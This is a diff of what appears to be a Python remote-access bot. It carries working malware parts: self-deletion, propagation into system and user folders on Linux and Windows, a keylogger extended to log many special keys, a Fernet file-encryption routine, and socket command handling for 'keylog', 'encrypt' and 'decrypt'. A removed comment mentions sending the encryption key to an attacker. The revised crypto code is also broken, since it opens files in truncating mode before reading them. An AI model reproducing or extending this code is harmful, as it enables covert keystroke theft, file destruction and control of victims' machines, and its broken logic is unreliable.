@@ -83,8 +83,8 @@ def self_delete():
 			run([r'del C:\Users\%username%\AppData\\' + FILENAME], shell=True) # ^
 			run(r'del', fullpath, shell=True) # ^
 		except:
-			return r"Couldn't remove all files..." # Return this if deletion operation fails.
-		return r'Deleted all files...' # Returns this if deletion operation is successful.
+			return r"  Couldn't remove all files..." # Return this if deletion operation fails.
+		return r'  Deleted all files...' # Returns this if deletion operation is successful.
 
 def propagate(name: str):
 	"""This function will create other instances of this file in 
@@ -105,8 +105,8 @@ def propagate(name: str):
 			run(['cp', name, '/etc']) # ^
 			run(['cp', name, '/var']) # ^
 		except:
-			return r'Unable to propagate..." # Return this string if copying operation fails.'
-		return r'File has been cloned to /tmp /etc and /var folders...' # Return this string is we successfully copied files.
+			return r'  Unable to propagate..." # Return this string if copying operation fails.'
+		return r'  File has been cloned to /tmp /etc and /var folders...' # Return this string is we successfully copied files.
 	else:
 		try:
 			'''
@@ -117,8 +117,8 @@ def propagate(name: str):
 			run(['copy', name, r'C:\Users\%username%\\']) # ^
 			run(['copy', name, r'C:\Users\%username%\AppData\\']) # ^
 		except:
-			return r'Unable to propagate...' # Return this string if copying operation fails.
-		return r'File has been cloned to temp, C:\Users\[current user]\, and AppData\...' # Return this string is we successfully copied files.
+			return r'  Unable to propagate...' # Return this string if copying operation fails.
+		return r'  File has been cloned to temp, C:\Users\[current user]\, and AppData\...' # Return this string is we successfully copied files.
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -142,6 +142,30 @@ def on_press(key):
 		elif key == key.ctrl: LOG += ' ctrl+' # If control key is pressed append string 'ctrl+' followed by key pressed.
 		elif key == key.tab: LOG += '\t' # If tab key is pressed, append tab to string.
 		elif key == key.cmd: LOG += ' cmd+'
+		elif key == key.alt: LOG += ' alt+'
+		elif key == key.caps_lock: LOG += ' CapsLock '
+		elif key == key.delete: LOG += ' Del '
+		elif key == key.down: LOG += ' DownArrow '
+		elif key == key.left: LOG += ' LeftArrow '
+		elif key == key.up: LOG += ' UpArrow '
+		elif key == key.right: LOG += ' RightArrow'
+		elif key == key.esc: LOG += ' esc '
+		elif key == key.home: LOG += ' HomeKey '
+		elif key == key.insert: LOG += ' InsertKey '
+		elif key == key.print_screen: LOG += ' PrintScreen '
+		elif key == key.shift: LOG += ' shift+'
+		elif key == key.f1: LOG += ' F1 '
+		elif key == key.f2: LOG += ' F2 '
+		elif key == key.f3: LOG += ' F3 '
+		elif key == key.f4: LOG += ' F4 '
+		elif key == key.f5: LOG += ' F5 '
+		elif key == key.f6: LOG += ' F6 '
+		elif key == key.f7: LOG += ' F7 '
+		elif key == key.f8: LOG += ' F8 '
+		elif key == key.f9: LOG += ' F9 '
+		elif key == key.f10: LOG += ' F10 '
+		elif key == key.f11: LOG += ' F11 '
+		elif key == key.f12: LOG += ' F12 '
 		else:
 			LOG += str(key) # Append any other special key not handled above.
 
@@ -182,43 +206,32 @@ def keylogger():
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-def crypto(action, *request):
+def crypto(action: str, request):
 	"""This function will handle all of our encryption/decryption processes.
 		Argument:
 			action (str): Will take value of encrypt or decrypt.
+			request (list): A list containing file name or file and decryption key if action eq decrypt.
 		Returns:
 			Confirmation string.
 	"""
-	key_copy = '' # Will store copy of encryption to send to attacker.
-
-	def encrypt_it():
-		"""Encrypts file"""
-		to_encrypt = request # Get the file to encrypt.
-		with open(to_encrypt, 'rb') as inf: # Open file in read bytes mode to encrypt.
-			data = inf.read() # Read data from file.
-			with open(to_encrypt, 'wb') as ouf: # Open the same file in write bytes mode.
-				key = Fernet.generate_key() # Generate encryption key.
-				key_copy = key # Store copy of generated key.
-				cipher = Fernet(key) # Instantiate Fernet object for encryption.
-				cipher_text = cipher.encrypt(data) # Encrypt the file data.
-				ouf.write(cipher_text) # Write the encrypted data into the file.
-		return r'File encrypted... Key = ' + key_copy + '. Store this key for decryption.' # Return this confirmation string.
-	
-	def decrypt_it():
-		"""Decrypts file"""
-		to_encrypt, key = request # Unpack the file to decrypt and the encryption key.
-		with open(to_encrypt, 'rb') as inf: # Open file in read bytes mode to decrypt.
-			data = inf.read() # Read data from file.
-			with open(to_encrypt, 'wb') as ouf: # Open the same file in write bytes modes.
-				cipher = Fernet(key) # Instantiate Fernet object with original key for decryption.
-				plain_text = cipher.decrypt(data) # Decrypt the file data.
-				ouf.write(plain_text) # Write the decrypted data into the file.
-		return r'File Decrypted...' # Return this confirmation string.
-
-	if action == 'encrypt': # Check if the action asked for was encrypt.
-		return encrypt_it() # Will perform encryption process and return confirmation string.
+	if action == 'encrypt':
+		to_encrypt = request[0]
+		f = open(to_encrypt, 'wb+')
+		data = f.read()
+		key = Fernet.generate_key()
+		cipher = Fernet(key)
+		cipher_text = cipher.encrypt(data)
+		f.write(cipher_text)
+		f.close()
+		return f'{to_encrypt} encrypted.'
 	else:
-		return decrypt_it() # If action not equals to encrypt, perform decryption process and return confirmation strings.
+		to_encrypt, key = request
+		f = open(to_encrypt, 'wb+')
+		cipher_text = f.read()
+		cipher = Fernet(key)
+		plain_text = cipher.decrypt(cipher_text)
+		f.close()
+		return '[+] File successfully decrypted!'
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -265,7 +278,7 @@ class WindowsBot:
 			with sock: # Utilizing this socket connection in context manager.
 				while True: # Continue to receive commands.
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-					command_output = None
+					command_output = 'Invalid command'
 					if command.strip() == 'keylog': # Start the keylogger.
 						keylogger()
 					elif command[:7] == 'encrypt': # Encrypt file specified.
@@ -326,9 +339,9 @@ class LinuxBot:
 			with sock: # Utilizing this socket connection in context manager.
 				while True: # Continue to receive commands.
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
-					command_output = None
+					command_output = 'Ivvalid command.'
 					if command.strip() == 'keylog': # Start the keylogger.
-						keylogger()
+						command_output = 'listening'
 					elif command[:7] == 'encrypt': # Encrypt file specified.
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt': # Decrypt file with key.
